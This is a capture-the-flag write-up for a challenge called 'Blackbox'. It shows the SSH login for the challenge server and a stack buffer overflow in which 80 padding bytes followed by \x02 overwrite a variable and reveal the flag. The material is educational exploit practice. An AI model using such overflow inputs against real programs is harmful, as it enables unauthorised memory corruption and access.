# Blackbox
What is 1 + 1? Run the command: ssh blackbox@104.131.79.111 -p 1001 (pw: guest).

## Solution
I began by trying normal exploit recon (ltrace, strace, strings, gdb), however,
these commands failed since the file is read protected.

I then tested if I could cause a segfault by overflowing the input buffer:
```
blackbox@ubuntu-512mb-nyc3-01:~$ python -c "print 'A' * 300" | ./blackbox
What is 1 + 1 = No dummy... 1 + 1 != 1094795585...
*** stack smashing detected ***: ./blackbox terminated

[1]+  Stopped                 python -c "print 'A' * 300" | ./blackbox
```

Playing around with the amount of characters printed, I found the sweetspot was
80:
```
blackbox@ubuntu-512mb-nyc3-01:~$ python -c "print 'A' * 80 + '2'" | ./blackbox
What is 1 + 1 = No dummy... 1 + 1 != 50...
```

The number 2 in ascii has the decimal value 50. Changing the number 2 to 0x02
was the solution.

```
blackbox@ubuntu-512mb-nyc3-01:~$ python -c "print 'A' * 80 + '\x02'" | ./blackbox
What is 1 + 1 = CORRECT! You get flag:
flag{0n3_4lus_1_1s_Tw0_dumm13!!}

[1]+  Stopped                 python -c "print 'A' * 80 + '\x02'" | ./blackbox
```
